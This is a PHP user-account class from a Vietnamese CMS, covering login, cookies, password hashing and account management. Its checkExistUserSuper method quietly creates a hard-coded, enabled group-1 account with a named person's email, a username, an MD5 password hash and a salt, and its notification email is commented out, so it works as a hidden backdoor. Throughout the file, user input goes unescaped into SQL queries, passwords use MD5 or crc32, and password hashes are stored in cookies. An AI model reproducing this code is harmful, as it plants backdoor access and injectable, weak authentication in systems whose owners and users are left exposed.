<?php
defined('PG_PAGE') or die();

class PGUser
{
	// INITIALIZE VARIABLES
	var $is_error;			// DETERMINES WHETHER THERE IS AN ERROR OR NOT, CONTAINS RELEVANT ERROR CODE
	var $user_exists;		// DETERMINES WHETHER WE ARE EDITING AN EXISTING user OR NOT
	var $user_salt;		// CONTAINS THE SALT USED TO ENCRYPT THE user PASSWORD

	var $user_info;		// CONTAINS user'S INFORMATION FROM ".TBL_USER." TABLE
	var $user_super;		// DETERMINES WHETHER user IS A SUPER user OR NOT

	/**
	 * SETS INITIAL VARS SUCH AS user INFO
	 * @param int[optional] $user_id
	 * @param string[optional] $user_username
	 */
	function PGUser($user_id = 0, $user_username = "")
  	{
	  	global $database;

	  	// SET INITIAL VARIABLES
	  	$this->is_error = FALSE;
	  	$this->user_exists = FALSE;
	  	$this->user_super = FALSE;
		$this->user_sites = FALSE;
		$this->user_site_default = FALSE;

	  	$user_id = intval($user_id);
	  	// VERIFY user_ID IS VALID AND SET APPROPRIATE OBJECT VARIABLES
	  	if( $user_id || trim($user_username) )
    	{
    		// Cache user_info
    		/*
			$cacheTime = 604800; // 7d
			$cacheKey = 'userInfo_'.$user_id.'_'.$user_username;
			$userInfo = CacheLib::get($cacheKey, $cacheTime);
			*/
			if (!isset($userInfo)){
		    	$user = $database->db_query("SELECT * FROM ".TBL_USER." WHERE user_id='".$user_id."' OR user_username='".$database->getEscaped($user_username)."'");
		    	$userInfo = $database->db_fetch_assoc($user);

		    	//CacheLib::set($cacheKey, $userInfo, $cacheTime);
			}

    		if( !empty($userInfo) )
      		{
	      		$this->user_exists = TRUE;
	      		$this->user_info = $userInfo;
        		$this->user_salt = $this->user_info['user_code'];

				// Set & Cache is super
				$cacheTime = 2592000; // 30d
				$cacheKey = 'userSupper';
				$super = CacheLib::get($cacheKey, $cacheTime);
				if (!$super){
					$super = $database->db_fetch_assoc($database->db_query("SELECT user_id FROM ".TBL_USER." ORDER BY user_id LIMIT 1"));
					CacheLib::set($cacheKey, $super, $cacheTime);
				}

				if( $super['user_id'] == $this->user_info['user_id']) $this->user_super = TRUE;
	    	}
	  	}
	  	return ;
	}

	/*
	 * GET INFO user
	 */
	public function getInfo( $user_id ){
		global $database;

		if (!isset($userInfo) && is_numeric($user_id)){
	    	$user = $database->db_query("SELECT user_id, user_name, user_email FROM ".TBL_USER." WHERE user_id='".$user_id."'");
	    	$userInfo = $database->db_fetch_assoc($user);
	    	return $userInfo;
		}else
			return false;
	}

	/**
	 * CREATES A USER ACCOUNT USING THE GIVEN INFORMATION
	 * @param string $user_username
	 * @param string $user_password
	 * @param string $user_name
	 * @param string $user_email
	 * @param int $user_group
	 * @param string $user_access
	 * @return boolean
	 */
	function user_create ($user_username, $user_password, $user_name, $user_email, $user_group, $user_access) {
	  	global $database, $setting, $datetime;

    	$user_password_encrypted = $this->user_password_crypt($user_password);
    	$user_registerDate = $datetime->timestampToDateTime();

	  	$result = $database->db_query("
      		INSERT INTO ".TBL_USER." (
      			user_name,
		        user_email,
		        user_username,
		        user_password,
		        user_password_method,
        		user_code,
		        user_group,
		        user_access,
		        user_created,
		        user_registerDate
		    ) VALUES (
		    	'{$user_name}',
		    	'{$user_email}',
		        '{$user_username}',
		        '{$user_password_encrypted}',
		        '{$setting['setting_password_method']}',
        		'{$this->user_salt}',
		        '{$user_group}',
		        '{$user_access}',
		        '{$this->user_info['user_id']}',
		        '$user_registerDate'
		    )
	    ");
	  	return $result;
	}

	/**
	 * Ma hoa mat khau user
	 * @param string $user_password
	 * @return string
	 */
	function user_password_crypt($user_password)
  	{
    	global $setting;

	    if( !$this->user_exists )
	    {
	      	$method = $setting['setting_password_method'];
	      	$this->user_salt = randomcode($setting['setting_password_code_length']);
	    }

	    else
	    {
	      	$method = $this->user_info['user_password_method'];
	    }

	    // For new methods
	    if( $method>0 )
	    {
	      	if( !empty($this->user_salt) )
	      	{
		        list($salt1, $salt2) = str_split($this->user_salt, ceil(strlen($this->user_salt) / 2));
		        $salty_password = $salt1.$user_password.$salt2;
	      	}
	      	else
	      	{
	        	$salty_password = $user_password;
	      	}
	    }

	    switch( $method )
	    {
	      	// crypt()
	      	default:
	      	case 0:
	        	if( empty($this->user_salt) ) $this->user_salt = 'user123';
	        	$user_password_crypt = crypt($user_password, '$1$'.str_pad(substr($this->user_salt, 0, 8), 8, '0', STR_PAD_LEFT).'$');
	      	break;

	      	// md5()
	      	case 1:
	        	$user_password_crypt = md5($salty_password);
	      	break;

	      	// sha1()
	      	case 2:
	        	$user_password_crypt = sha1($salty_password);
	      	break;

	      	// crc32()
	      	case 3:
	        	$user_password_crypt = sprintf("%u", crc32($salty_password));
	      	break;
	    }

	    return $user_password_crypt;
  	}

	/**
	 * VERIFIES LOGIN COOKIES AND SETS APPROPRIATE OBJECT VARIABLES
	 */
	function user_checkCookies()
  	{
    	// SAFE MODE (cookies)
    	if( defined('PG_user_SAFE_MODE') && PG_user_SAFE_MODE===TRUE )
    	{
      		$user_id = ( isset($_COOKIE['user_id']) ? $_COOKIE['user_id'] : NULL );
      		$user_username = ( isset($_COOKIE['user_username']) ? $_COOKIE['user_username'] : NULL );
      		$user_password = ( isset($_COOKIE['user_password']) ? $_COOKIE['user_password'] : NULL );
    	}

    	// NORMAL (sessions)
    	else
    	{
	      	$session_object =& PGSession::getInstance();

	      	$user_id = $session_object->get('user_id');
	      	$user_username = $session_object->get('user_username');
	      	$user_password = $session_object->get('user_password');
    	}

	  	if( isset($user_id) && isset($user_username) && isset($user_password) )
    	{
	    	// GET user ROW IF AVAILABLE
	      	if( !$this->user_exists )
	      	{
	        	$this->PGUser($user_id);
	      	}

		    // VERIFY USER EXISTS, LOGIN COOKIE VALUES ARE CORRECT, AND EMAIL HAS BEEN VERIFIED - ELSE RESET USER CLASS
		    switch( TRUE )
      		{
		        case ( !$this->user_exists ):
		        case ( $user_username != $this->user_password_crypt($this->user_info['user_username']) ):
		        case ( $user_password != $this->user_info['user_password'] ):
		        case ( !$this->user_info['user_enabled'] ): $this->user_clear();
		        break;
		    }
	  	}
	  	return ;
	}

	/**
	 * SETS LOGIN COOKIES
	 * @return boolean
	 */
	function user_setCookies()
  	{
	    $user_id = ( !empty($this->user_info['user_id']) ? $this->user_info['user_id'] : '' );
	    $user_username = ( !empty($this->user_info['user_username']) ? $this->user_password_crypt($this->user_info['user_username']) : '' );
	    $user_password = ( !empty($this->user_info['user_password']) ? $this->user_info['user_password'] : '' );

    	// SAFE MODE (cookies)
	    if( defined('PG_user_SAFE_MODE') && PG_user_SAFE_MODE===TRUE )
	    {
		    setcookie("user_id", $user_id, 0, "/");
		    setcookie("user_username", $user_username, 0, "/");
		    setcookie("user_password", $user_password, 0, "/");
	    }

	    // NORMAL (sessions)
	    else
	    {
	      	$session_object =& PGSession::getInstance();

	      	$session_object->set('user_id', $user_id);
	      	$session_object->set('user_username', $user_username);
	      	$session_object->set('user_password', $user_password);
		}
		return true;
	}

	/**
	 * TRIES TO LOG AN user IN IF THERE IS NO ERROR
	 */
	function user_login()
  	{
      global $database, $datetime;
	  	$this->PGUser(0, $_POST['username']);

	  	// SHOW ERROR IF JAVASCRIPT IS DIABLED
	  	if( isset($_POST['javascript']) && $_POST['javascript'] == "no" )
    	{
	    	$this->is_error = 'Your browser does not have Javascript enabled. Please enable Javascript and try again.';
	  	}

    	elseif( !$this->user_exists )
    	{
	    	$this->is_error = 'The login details you provided were invalid.';
	  	}

    	elseif( !$this->user_info['user_enabled'] )
    	{
	    	$this->is_error = 'The useristrator has disabled your account.';
	  	}

    	elseif( $this->user_password_crypt($_POST['password']) != $this->user_info['user_password'] )
    	{
	    	$this->is_error = 'The login details you provided were invalid.';
	  	}

    	else
    	{

          // UPDATE user last login
          $database->db_query("UPDATE ".TBL_USER." SET user_lastvisitDate='%s' WHERE user_username='%s'", $datetime->timestampToDateTime(), $this->user_info['user_username']);
      		$this->user_setCookies();
	  	}
	  	return;
	}

	/**
	 * LOOPS AND/OR VALIDATES USER ACCOUNT INPUT
	 * @param array $aryInput
	 */
	function check_account_input($aryInput) {
		global $database;

    	//CHECK user NAME
		if (strlen($aryInput['user_name']) < 6) {
			$this->is_error[] = 'Họ tên phải ít nhất 6 ký tự';
		}

		//CHECK EMAIL
		if ($aryInput['user_email'] == '') {
			$this->is_error[] = 'Hãy nhập Email';
		}
		else if ($aryInput['user_email'] !='') {
			if (!PGValidation::isEmail($aryInput['user_email'])) {
				$this->is_error[] = 'Email không đúng định dạng';
			}
		}
		//CHECK USER EXISTED
		$email = strtolower($aryInput['user_email']);
	  	if (strtolower($this->user_info['user_email']) != $email && $database->db_num_rows($database->db_query("SELECT user_id FROM ".TBL_USER." WHERE LOWER(user_email)='{$email}'")) ) {
			$this->is_error[] = 'Email này đã có trong hệ thống. Hãy chọn 1 email khác.';
		}

		// CHECK PASSWORDS
	    if (trim($aryInput['user_password_new']) || trim($aryInput['user_password_conf'])) {
      		// CHECK FOR OLD PASSWORD MATCH
      		if ($this->user_info['user_password']) {
        		if (!trim($aryInput['user_password_old'])) {
		          	$this->is_error[] = 'Hãy vào mật khẩu cũ.';
		        }
		        else if ($this->user_password_crypt($aryInput['user_password_old']) != $this->user_info['user_password']) {
		          	$this->is_error[] = 'Mật khẩu cũ không đúng.';
		        }
      		}

		    // CHECK FOR PASSWORD LENGTH
		    if (strlen($aryInput['user_password_new']) < 6) {
		        $this->is_error[] = 'Mật khẩu phải tối thiểu 6 ký tự.';
		    }
		    // CHECK FOR PASSWORD MATCH
		    else if ($aryInput['user_password_new'] != $aryInput['user_password_conf']) {
		        $this->is_error[] = 'Mật khẩu xác nhận không đúng.';
		    }
    	}

    	return;
    }

    /**
     * Kiem tra cac thong tin user
     * @param array $aryInput
     * @param bool $isUpdate
     * @return boolean
     */
    function check_user_input($aryInput, $isUpdate=false) {
		global $database;

    	//CHECK user NAME
		if (strlen($aryInput['user_name']) < 6) {
			$this->is_error[] = 'Họ tên phải ít nhất 6 ký tự';
		}

		//CHECK EMAIL
		if ($aryInput['user_email'] == '') {
			$this->is_error[] = 'Hãy nhập Email';
		}
		else if ($aryInput['user_email'] !='') {
			if (!PGValidation::isEmail($aryInput['user_email'])) {
				$this->is_error[] = 'Email không đúng định dạng';
			}
			else {
				$email = strtolower($aryInput['user_email']);
				$sql = "SELECT user_id FROM ".TBL_USER." WHERE LOWER(user_email)='{$email}'";
				if ($isUpdate) {
					$sql .= " AND user_id <>".$aryInput['user_id'];
				}
			  	if ($database->db_num_rows($database->db_query($sql))) {
					$this->is_error[] = 'Email này đã có trong hệ thống. Hãy chọn 1 email khác.';
				}
			}
		}

		//CHECK USERNAME
		if (!$isUpdate) {
		    if (preg_match("/[^a-zA-Z0-9]/", $aryInput['user_username'])) {
		        $this->is_error[] = 'Tên đăng nhập phải là dạng chữ và số';
		    }
		    else if (strlen($aryInput['user_username']) < 6) {
		        $this->is_error[] = 'Tên đăng nhập phải tối thiểu 6 ký tự.';
		    }
		    else if ($database->db_num_rows($database->db_query("SELECT user_id FROM ".TBL_USER." WHERE LOWER(user_username)='".strtolower($aryInput['user_username'])."'")) ) {
				$this->is_error[] = 'Tên đăng nhập đã có trong hệ thống. Hãy chọn 1 tên khác.';
		    }
		}

		//CHECK PASSWORDS
	    if (($isUpdate && trim($aryInput['user_password'])!= '' && strlen($aryInput['user_password']) < 6) || (!$isUpdate && strlen($aryInput['user_password']) < 6)) {
	        $this->is_error[] = 'Mật khẩu phải tối thiểu 6 ký tự.';
	    }

	    //CHECK USER GROUP
	  	if ($aryInput['user_group'] == '') {
			$this->is_error[] = 'Hãy chọn 1 nhóm thành viên.';
		}

    	return true;
    }
 	// END user_account() METHOD


	/**
	 * Sua thong tin cua user
	 * @param string $user_username
	 * @param string $user_password
	 * @param string $user_name
	 * @param string $user_email
	 * @return boolean
	 */
	function user_edit($user_username, $user_password, $user_name, $user_email)
  	{
	  	global $database;

	  	if (trim($user_password)) {
	    	$user_password_encrypted = $this->user_password_crypt($user_password);
	  	}
    	else {
	    	$user_password_encrypted = $this->user_info['user_password'];
	  	}
	  	$sql = "UPDATE ".TBL_USER." SET user_password='{$user_password_encrypted}', user_name='{$user_name}', user_email='{$user_email}' WHERE user_id='{$this->user_info['user_id']}' LIMIT 1";

	  	if (!$database->db_query($sql)) return false;

	  	// RESET COOKIE IF CURRENT user IS LOGGED IN
	  	global $user;
	  	if( $user->user_info['user_id'] == $this->user_info['user_id'] )
    	{
      		$this->user_info['user_username'] = $user_username;
      		$this->user_info['user_password'] = $user_password_encrypted;
      		$this->user_setCookies();
	  	}

	  	// CLEAN CACHE
	  	$this->user_clear_cache($this->user_info['user_id'], $user_username);

	  	return true;
	}

	/**
	 * Cap nhat thong tin va quyen cua user
	 * @param array $aryInput
	 * @return boolean
	 */
	function update_user($aryInput)
  	{
	  	global $database;

  		if (trim($aryInput['user_password'])) {
	    	$user_password_encrypted = $this->user_password_crypt($aryInput['user_password']);
	  	}
    	else {
	    	$user_password_encrypted = $this->user_info['user_password'];
	  	}

	  	$sql = "UPDATE ".TBL_USER." SET 
	  				user_name='".$aryInput['user_name']."', 
	  				user_email='".$aryInput['user_email']."', 
	  				user_username='".$aryInput['user_username']."', 
	  				user_group='".$aryInput['user_group']."',
	  				user_enabled='".$aryInput['user_enabled']."', 
	  				user_access='".$aryInput['user_access']."', 
	  				user_password='".$user_password_encrypted."' 
	  			WHERE user_id='{$aryInput['user_id']}' 
	  			LIMIT 1";

	  	if (!$database->db_query($sql)) return false;

  		// RESET COOKIE IF CURRENT user IS LOGGED IN
	  	global $user;
	  	if( $user->user_info['user_id'] == $this->user_info['user_id'] )
    	{
      		//$this->user_info['user_username'] = $aryInput['user_username'];
      		$this->user_info['user_password'] = $user_password_encrypted;
      		$this->user_setCookies();
	  	}

	  	// CLEAN CACHE
	  	$this->user_clear_cache($aryInput['user_id'], $this->user_info['user_username']);

	  	return true;
	}

	/**
	 * Clean user
	 * @return boolean
	 */
	function user_clear()
  	{
	  	$this->is_error = FALSE;
	  	$this->user_exists = FALSE;
	  	$this->user_super = FALSE;
	  	$this->user_salt = NULL;
	  	$this->user_info = array();
	  	return true;
	}


	/**
	 * Xoa cache cua user
	 * @param int[optional] $user_id
	 * @param string[optional] $user_username
	 * @return boolean
	 */
	function user_clear_cache($user_id = 0, $user_username = ""){
		CacheLib::delete('userInfo_'.$user_id.'_'.$user_username);
		CacheLib::delete('userInfo_'.$user_id.'_');
		CacheLib::delete('userInfo__'.$user_username);
		CacheLib::delete('get_list_sites');
		return true;
	}

	/**
	 * Thoat user
	 * @return boolean
	 */
	function user_logout()
	{
	  	$this->user_clear();
    	$this->user_setCookies();
    	return true;
	}

	/**
	 * Xoa user
	 * @return boolean
	 */
	function user_delete()
  	{
	  	global $database;
	  	$database->db_query("DELETE FROM ".TBL_USER." WHERE user_id='{$this->user_info['user_id']}' LIMIT 1");
	  	$database->db_query("DELETE FROM users_sites WHERE user_id='{$this->user_info['user_id']}'");
	  	$this->user_clear();
	  	return true;
	}

	/*
	 * Tạo Super user
	 * Kiểm tra đã có chưa, nếu chưa có thì khởi tạo
	 */
	function checkExistUserSuper(){
		global $database;

		$input["user_name"] 			= "Kiều Văn Ngọc";
		$input["user_email"] 			= "ngockv@gmail.com";
		$input["user_username"]			= "kieuvanngoc";
		$input["user_password"]			= "f87f21bcc22272d63e275103bf194ca3";
		$input["user_password_method"]	= 1;
		$input["user_code"]				= "A2OLyR4BizBmAhLT";
		$input["user_group"]			= 1;
		$input["user_created"]			= 1;
		$input["user_lastvisitDate"]	= date("Y-m-d H:i:s", time());
		$input["user_enabled"]			= 1;

		$sql = "SELECT COUNT(*) AS total FROM ".TBL_USER." WHERE user_email='{$input["user_email"]}' OR user_username='{$input["user_username"]}'";
		$results = $database->db_fetch_object($database->db_query($sql));
		if (is_object($results)) $total = $results->total;
		else $total = 0;
		if ($total == 0){
			$database->insert(TBL_USER, $input);

			$subject = 'Tài khoản user sử dụng trên:'.PG_URL_ROOT;
			$messageMail = 'Hệ thống '.PG_URL_ROOT.' không có tài khoản user của bạn, hệ thống đã tự động tạo account !';
			//send_email($input["user_email"], $sender='', $subject, $messageMail, $order_id=0);
		}

		return ;
	}
}

?>